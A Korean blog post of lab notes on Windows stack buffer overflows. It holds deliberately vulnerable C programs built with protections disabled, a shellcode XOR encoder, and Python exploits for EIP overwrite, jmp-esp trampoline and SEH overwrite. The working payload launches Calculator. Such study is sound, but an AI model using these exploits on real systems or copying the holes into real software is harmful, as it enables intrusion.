---
title: 윈도우 시스템 해킹 - 스택 버퍼 오버플로우
category:
    - System Hacking
tags:
    - Windows
    - System
    - Hacking
---

[윈도우 시스템 해킹 가이드 / 김현민 저] <br/>
위의 책을 보면서 실습한 코드를 정리함.

Visual Studio로 보안 옵션을 해제한 후 컴파일하여 취약 프로그램을 만들고 Exploit 하였다. 보안 옵션은 다음과 같다. 설명은 링크 참조.

- 프로젝트 속성 > C/C++ > 코드 생성 > 보안 검사
- 프로젝트 속성 > 링커 > 고급 > DEP(데이터 실행 방지)
- 프로젝트 속성 > 링커 > 고급 > 임의 기준 주소
- 프로젝트 속성 > 링커 > 고급 > 이미지에 안전한 예외 처리기 포함

[참조링크](https://5kyc1ad.tistory.com/314)

### # ShellCode
이전 실습때 cmd를 띄우는 쉘코드를 약간 수정하여 계산기를 띄우도록 하는 쉘코드를 작성하였다. 이번 실습땐 `strcpy`와 `fgets`를 사용하기 때문에 특정 제어문자들을 제외할 필요가 있어서 Encoder를 통해 그러한 제어문자들을 제거시켜 주었다.
```python
import os, sys, random

def xor(data, key):
	leng = len(key)
	reverse = b""
	for i in range(0, len(data)):
		reverse += bytes([(data[i] ^ (key[i % leng]))])	# XOR
	return reverse

def conv_hex(data):
	hex_str = ""
	for i in range(0, len(data)):
		tmp = hex(data[i])[2:]
		if len(tmp) == 1:
			tmp = "0" + tmp
		hex_str += ("0x%s" % tmp).replace('0x', '\\x')
	return hex_str

org_shellcode = (
	b"\x8B\xEC\xEB\x30\x42\xAD\x60\x03\xD8\x8B\xF3\x33\xC0\x33\xFF\xAC"
	b"\x03\xF8\x84\xC0\x75\xF9\x89\x7D\x10\x61\x39\x7D\x10\x75\xE5\x0F"
	b"\xB7\x54\x51\xFE\x8B\x7D\x18\x8B\x77\x1C\x03\xF3\x8B\x3C\x96\x03"
	b"\xFB\x8B\xC7\xC3\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x40\x14"
	b"\x8B\x18\x8B\x1B\x8B\x5B\x10\x8B\x7B\x3C\x03\xFB\x8B\x7F\x78\x03"
	b"\xFB\x89\x7D\x18\x8B\x77\x20\x03\xF3\x8B\x4F\x24\x03\xCB\x33\xD2"
	b"\x60\x33\xFF\x66\xBF\xB3\x02\xE8\x98\xFF\xFF\xFF\x89\x45\x20\x61"
	b"\x33\xFF\x66\xBF\x79\x04\xE8\x89\xFF\xFF\xFF\x89\x45\x24\x33\xC0"
	b"\xC6\x45\x0C\x63\xC6\x45\x0D\x61\xC6\x45\x0E\x6C\xC6\x45\x0F\x63"
	b"\x89\x45\x10\x33\xC0\x40\x50\x8D\x45\x0C\x50\xFF\x55\x20\x33\xC0"
	b"\x50\xFF\x55\x24"
)

noText = [ 0x0, 0x0a, 0xd ]
while True:
	xor_key = os.urandom(4)
	xor_shellcode = xor(org_shellcode, xor_key)
	test = xor_shellcode + xor_key
	isText = True
	for b in test:
		if b in noText:
			print(type(b), b, type(noText[0]))
			isText = False
			break
	if isText == True:
		break

decoder1 = b"\xe8\xff\xff\xff\xff\xc2\x5e"
decoder2 = b"\x33\xc9\xb1" + bytes([len(org_shellcode)//4 + 1])
decoder3 = b"\xbf" + xor_key
decoder_rand = [decoder1, decoder2, decoder3]
random.shuffle(decoder_rand)
decoder = b"".join(decoder_rand)
getpc_offset = len(decoder) - decoder.index(decoder1) + 3
decoder4 = b"\x31\x7e" + bytes([getpc_offset]) + b"\x83\xc6\x04" + b"\xe2\xf8"
decoder += decoder4

print(" [+] Window Calc_Shellcode")
print("Key : " + conv_hex(xor_key) + "\n")
print("Orginal : " + conv_hex(org_shellcode)+ "\n")
print("Encoded : " + conv_hex(decoder) + conv_hex(xor_shellcode) + "\n")
string = conv_hex(decoder) + conv_hex(xor_shellcode)

for idx, char in enumerate(string):
	if idx % 64 == 0:
		print("\tb\"", end='')
	print(char, end='')
	if idx % 64 == 63 or idx == len(string) - 1:
		print("\"")
```

`org_shellcode`가 계산기를 띄워주는 universal shellcode이고 `noText` 배열의 문자는 들어가지 않도록 인코딩하였다. 매번 다르게 나오기 때문에 이 글에서는 아래의 쉘코드로 했음을 미리 명시한다.

참고로 이전 실습 때 작성하였던 universal shellcode와 달리 초반에 `mov ebp, esp` 명령어를 추가해 주었는데, 이는 stack overflow가 일어나면서 ebp값이 꼬이는 상황을 대비해 다시 스택부분을 가리키도록 하기 위함이다.

```python
b"\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x2a\xbf\xce\xe7\xd6\xa7"
b"\x31\x7e\x13\x83\xc6\x04\xe2\xf8\x45\x0b\x3d\x97\x8c\x4a\xb6\xa4"
b"\x16\x6c\x25\x94\x0e\xd4\x29\x0b\xcd\x1f\x52\x67\xbb\x1e\x5f\xda"
b"\xde\x86\xef\xda\xde\x92\x33\xa8\x79\xb3\x87\x59\x45\x9a\xce\x2c"
b"\xb9\xfb\xd5\x54\x45\xdb\x40\xa4\x35\x6c\x11\x64\xaa\x46\xe6\xa7"
b"\xce\xe7\x5d\xe7\xc2\x6c\x96\xb3\x45\xff\x5d\xbc\x45\xbc\xc6\x2c"
b"\xb5\xdb\xd5\x5c\x45\x98\xae\xa4\x35\x6e\xab\xbf\x45\x90\xf6\xa4"
b"\x3d\x6c\x99\x83\xcd\x2c\xe5\x75\xae\xd4\x29\xc1\x71\x54\xd4\x4f"
b"\x56\x18\x29\x58\x47\xa2\xf6\xc6\xfd\x18\xb0\x18\xb7\xe3\x3e\x2e"
b"\x31\x18\x29\x2e\x8b\xc3\xe5\x67\x08\xa2\xda\xc4\x08\xa2\xdb\xc6"
b"\x08\xa2\xd8\xcb\x08\xa2\xd9\xc4\x47\xa2\xc6\x94\x0e\xa7\x86\x2a"
b"\x8b\xeb\x86\x58\x9b\xc7\xe5\x67\x9e\x18\x83\x83"
```

### # Direct EIP Overwrite

Retern 주소를 쉘코드 주소로 설정하면 된다.

#### 1. Vulnerable Code

취약한 코드는 아래와 같다.

```c
#pragma warning(disable:4996)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[]) {

	char printbuf[500] = { 0, };
	char readbuf[2000] = { 0, };
	printf("[+] Text Reader\n");
	if (argc != 2) {
		printf("	Usage : reader.exe filename\n");
		exit(1);
	}
	FILE *f = fopen(argv[1], "r");
	fgets(readbuf, 2000, f);
	strcpy(printbuf, readbuf);
	printf("File Contents : %s\n", printbuf);
	return 0;
}
```

보안 옵션
- 보안 검사 : 보안 검사 사용 안함(/GS-)
- DEP(데이터 실행 방지) : 아니요(/NXCOMPAT:NO)
- 임의 기준 주소 : 아니요(/DYNAMICBASE:NO)
- 이미지에 안전한 예외 처리기 포함 : 아니요(/SAFESEH:NO)

#### 2. Exploit Code

이를 exploit하는 txt를 생성하는 python 코드는 아래와 같다.

```python
# reader.exe exploit
import struct

print("[+] Create text file...")
NOP = b"\x90" * 100

SHELLCODE = (
        b"\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x2a\xbf\xce\xe7\xd6\xa7"
        b"\x31\x7e\x13\x83\xc6\x04\xe2\xf8\x45\x0b\x3d\x97\x8c\x4a\xb6\xa4"
        b"\x16\x6c\x25\x94\x0e\xd4\x29\x0b\xcd\x1f\x52\x67\xbb\x1e\x5f\xda"
        b"\xde\x86\xef\xda\xde\x92\x33\xa8\x79\xb3\x87\x59\x45\x9a\xce\x2c"
        b"\xb9\xfb\xd5\x54\x45\xdb\x40\xa4\x35\x6c\x11\x64\xaa\x46\xe6\xa7"
        b"\xce\xe7\x5d\xe7\xc2\x6c\x96\xb3\x45\xff\x5d\xbc\x45\xbc\xc6\x2c"
        b"\xb5\xdb\xd5\x5c\x45\x98\xae\xa4\x35\x6e\xab\xbf\x45\x90\xf6\xa4"
        b"\x3d\x6c\x99\x83\xcd\x2c\xe5\x75\xae\xd4\x29\xc1\x71\x54\xd4\x4f"
        b"\x56\x18\x29\x58\x47\xa2\xf6\xc6\xfd\x18\xb0\x18\xb7\xe3\x3e\x2e"
        b"\x31\x18\x29\x2e\x8b\xc3\xe5\x67\x08\xa2\xda\xc4\x08\xa2\xdb\xc6"
        b"\x08\xa2\xd8\xcb\x08\xa2\xd9\xc4\x47\xa2\xc6\x94\x0e\xa7\x86\x2a"
        b"\x8b\xeb\x86\x58\x9b\xc7\xe5\x67\x9e\x18\x83\x83"
)

print("Shellcode Length :", len(SHELLCODE))
DUMMY = b"A" * (500 - len(NOP + SHELLCODE)) + b"\xCC"*4 + b"A"*4
BUF = struct.pack('<L', 0x19FCFC)
contents = NOP + SHELLCODE + DUMMY + BUF

f = open("test.txt", "wb")
f.write(contents)
f.close()
print("[+] Done !!")
```

`DUMMY` 변수를 보면 책과 달리 `b"\xCC"*4`를 넣어준 것을 볼 수 있다. 처음에는 책과 비슷하게 코드를 작성하였으나, Stack관련 버그 메시지가 떴다. Ollydbg로 분석한 결과, 함수가 종료될 때 버퍼의 끝을 0xCCCCCCCC 와 비교하여 다르면 버그 메시지를 띄우는 함수가 있었다. (위에서 언급된 보안 옵션은 모두 해제한 상태였다.) 따라서 이를 우회하기 위해 위와 같이 처리해 주었다.


### # Trampoline Technique

Retern 주소를 메모리 어딘가에 있는 `jmp esp`의 주소로 바꾸고, 그 뒤에 `shellcode`를 삽입함. Ret 명령어가 실행되면 esp는 쉘코드의 주소를 가리키게 되고, 이후 `jmp esp`에 의해 쉘코드가 실행된다.

메모리 어딘가에 있는 `jmp esp`는 분석때와 공격시에 동일한 위치에 존재해야 하므로 `kernel32.dll`에서 검색하는 것이 좋다. 아마 이런 dll도 로딩될 때 매번 다른 주솟값을 할당 받겠지만, 재할당되는 일이 거의 없기 때문에 재부팅 전까지는 주솟값이 유지되는 것 같다. 참고로 Ollydbg에서 Memory 창에 들어간 후 KERNELBASE 를 한번 클릭하고 `ctrl + b`를 눌러 "FF E4"를 검색하면 유효한 `jmp esp`의 주솟값을 구할 수 있다.

#### 1. Vulnerable Code

동일한 취약한 코드에서 ASLR을 추가해주었다.

```c
#pragma warning(disable:4996)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[]) {

	char printbuf[500] = { 0, };
	char readbuf[2000] = { 0, };
	printf("[+] Text Reader\n");
	if (argc != 2) {
		printf("	Usage : reader.exe filename\n");
		exit(1);
	}
	FILE *f = fopen(argv[1], "r");
	fgets(readbuf, 2000, f);
	strcpy(printbuf, readbuf);
	printf("File Contents : %s\n", printbuf);
	return 0;
}
```

보안 옵션
- 보안 검사 : 보안 검사 사용 안함(/GS-)
- DEP(데이터 실행 방지) : 아니요(/NXCOMPAT:NO)
- 임의 기준 주소 : 예(/DYNAMICBASE)
- 이미지에 안전한 예외 처리기 포함 : 아니요(/SAFESEH:NO)

#### 2. Exploit Code
```python
# reader_aslr.exe exploit
import struct

print("[+] Create text file...")
NOP = b"\x90" * 100

SHELLCODE = (
        b"\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x2a\xbf\xce\xe7\xd6\xa7"
        b"\x31\x7e\x13\x83\xc6\x04\xe2\xf8\x45\x0b\x3d\x97\x8c\x4a\xb6\xa4"
        b"\x16\x6c\x25\x94\x0e\xd4\x29\x0b\xcd\x1f\x52\x67\xbb\x1e\x5f\xda"
        b"\xde\x86\xef\xda\xde\x92\x33\xa8\x79\xb3\x87\x59\x45\x9a\xce\x2c"
        b"\xb9\xfb\xd5\x54\x45\xdb\x40\xa4\x35\x6c\x11\x64\xaa\x46\xe6\xa7"
        b"\xce\xe7\x5d\xe7\xc2\x6c\x96\xb3\x45\xff\x5d\xbc\x45\xbc\xc6\x2c"
        b"\xb5\xdb\xd5\x5c\x45\x98\xae\xa4\x35\x6e\xab\xbf\x45\x90\xf6\xa4"
        b"\x3d\x6c\x99\x83\xcd\x2c\xe5\x75\xae\xd4\x29\xc1\x71\x54\xd4\x4f"
        b"\x56\x18\x29\x58\x47\xa2\xf6\xc6\xfd\x18\xb0\x18\xb7\xe3\x3e\x2e"
        b"\x31\x18\x29\x2e\x8b\xc3\xe5\x67\x08\xa2\xda\xc4\x08\xa2\xdb\xc6"
        b"\x08\xa2\xd8\xcb\x08\xa2\xd9\xc4\x47\xa2\xc6\x94\x0e\xa7\x86\x2a"
        b"\x8b\xeb\x86\x58\x9b\xc7\xe5\x67\x9e\x18\x83\x83"
	)

print("Shellcode Length :", len(SHELLCODE))
DUMMY = b"A" * 500 + b"\xCC"*4 + b"A"*4
DUMMY2 = b"\x90" * 28      # This is for stack use
JMP = struct.pack('<L',0x75184967)
contents = DUMMY + JMP + DUMMY2 + SHELLCODE

f = open("test.txt", "wb")
f.write(contents)
f.close()
print("[+] Done !!")

```

마찬가지로 `xCCCCCCCC`를 버퍼의 끝에 삽입해 주었다.

### # SEH Overwrite

윈도우 스택 보호 기법중 스택쿠키 기법이 있다. 이는 SFP위에 랜덤한 쿠키값을 두어 함수 종료부에 이 값이 변조되었는지 검사하는 것이다. 이를 우회하기 위해 SEH Overwrite 기법을 사용할 수 있다.

SEH의 구조에 대해서 좀 더 깊게 확인해보고 싶어서 [리버싱 핵심 원리]의 SEH 부분을 정독한 후 실습을 진행하였다. 간단하게 설명하자면 윈도우에서 예외가 발생할 때 예외처리 로직이 수행되는데, 각 예외처리에 대한 로직들(handler)이 연결리스트의 형태로 존재한다. 연결리스트의 요소는 next와 handler로 구성되어 있고 스택에 저장된다. 연결리스트의 첫 요소가 제일 최근에 추가한 요소가 되고, 해당 예외처리가 해결이 될 때까지 연결리스트를 참조한다.

예외가 발생하면 첫번째 handler주소의 코드를 실행한다. 이 때, 두번째 파라미터(`$ebp - 0x8`)로 현재 요소의 주솟값이 들어간다. 따라서 첫번째 handler의 주소가 `pop; pop; retn;`을 가리키고 첫번째 next부분을 jmp로 바꾸면 쉘코드를 실행시킬 수 있다.

=> 이해가 안갈 때는 책을 다시 보자.. 나도 헷갈림.

`pop; pop; retn`은 immunity debugger의 pycommand 기능을 사용하여 찾을 수 있다. `!search pop r32\npop r32\nretn` 명령어를 통해 검색을 하고, SafeSEH가 적용되어 있지 않은 취약 코드 모듈 부분을 선택하면 된다.


#### 1. Vulnerable Code

```c
#pragma warning(disable:4996)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[]) {

	char readbuf[500] = { 0, };
	printf("[+] Text Reader\n");
	if (argc != 2) {
		printf("	Usage : reader.exe filename\n");
		exit(1);
	}
	FILE *f = fopen(argv[1], "r");
	fgets(readbuf, 3000, f);
	printf("File Contents : %s\n", readbuf);
	return 0;
}
```

보안 옵션
- 보안 검사 : 보안 검사 사용 안함(/GS-)
- DEP(데이터 실행 방지) : 아니요(/NXCOMPAT:NO)
- 임의 기준 주소 : 예(/DYNAMICBASE)
- 이미지에 안전한 예외 처리기 포함 : 아니요(/SAFESEH:NO)

스택에 3000 byte정도 할당되어 있는 것 같아서 안전하게 3000만큼 입력받도록 하였다.


#### 2. Exploit Code
```python
# reader_seh.exe exploit
import struct

shellcode = (
        b"\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x2a\xbf\xce\xe7\xd6\xa7"
        b"\x31\x7e\x13\x83\xc6\x04\xe2\xf8\x45\x0b\x3d\x97\x8c\x4a\xb6\xa4"
        b"\x16\x6c\x25\x94\x0e\xd4\x29\x0b\xcd\x1f\x52\x67\xbb\x1e\x5f\xda"
        b"\xde\x86\xef\xda\xde\x92\x33\xa8\x79\xb3\x87\x59\x45\x9a\xce\x2c"
        b"\xb9\xfb\xd5\x54\x45\xdb\x40\xa4\x35\x6c\x11\x64\xaa\x46\xe6\xa7"
        b"\xce\xe7\x5d\xe7\xc2\x6c\x96\xb3\x45\xff\x5d\xbc\x45\xbc\xc6\x2c"
        b"\xb5\xdb\xd5\x5c\x45\x98\xae\xa4\x35\x6e\xab\xbf\x45\x90\xf6\xa4"
        b"\x3d\x6c\x99\x83\xcd\x2c\xe5\x75\xae\xd4\x29\xc1\x71\x54\xd4\x4f"
        b"\x56\x18\x29\x58\x47\xa2\xf6\xc6\xfd\x18\xb0\x18\xb7\xe3\x3e\x2e"
        b"\x31\x18\x29\x2e\x8b\xc3\xe5\x67\x08\xa2\xda\xc4\x08\xa2\xdb\xc6"
        b"\x08\xa2\xd8\xcb\x08\xa2\xd9\xc4\x47\xa2\xc6\x94\x0e\xa7\x86\x2a"
        b"\x8b\xeb\x86\x58\x9b\xc7\xe5\x67\x9e\x18\x83\x83"
	)

print("[+] Create text file...")
dummy = b"A" * 600
nseh = struct.pack('<L', 0x909006eb)    # nop nop jmp
# seh = struct.pack('<L', 0x2D20E2)
seh = struct.pack('<L', 0x2D20E2)
contents = dummy + nseh + seh + shellcode + b"A" * 3000
f = open("test.txt", "wb")
f.write(contents)
f.close()
```

- 왜 safeSEH가 적용되어있지 않은 모듈의 코드를 사용해야하나?
> safeSEH가 적용되어 있으면 Handler가 실행되기 전 운영체제에서 Handler의 주소값을 검증해서 원하는대로 실행이 안된다.

- ASLR이 적용되었는데 고정주소의 명령어를 어떻게 찾나?
> ASLR이 text section은 randomize하지 않음.
